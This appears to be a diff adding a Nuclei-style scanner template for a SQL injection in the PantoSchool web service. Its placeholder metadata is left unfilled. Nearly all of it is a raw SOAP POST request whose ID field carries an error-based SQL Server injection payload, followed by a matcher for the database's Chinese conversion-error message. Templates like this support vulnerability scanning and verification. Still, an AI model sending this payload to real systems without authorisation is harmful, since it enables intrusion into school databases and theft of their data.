@@ -1,0 +1,40 @@
+id: xuefen-PantoSchool-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /WebService_PantoSchool.asmx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: ASP.NET_SessionId=e5l5acb3exqi5bmtezazrjsg
+        Upgrade-Insecure-Requests: 1
+        Priority: u=1
+        SOAPAction: http://tempuri.org/GetCalendarContentById
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 531
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:GetCalendarContentById>
+                 <!--type: string-->
+                 <tem:ID>-7793' OR 7994 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7994=7994) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND 'qciT'='qciT</tem:ID>
+              </tem:GetCalendarContentById>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '在将 varchar 值'
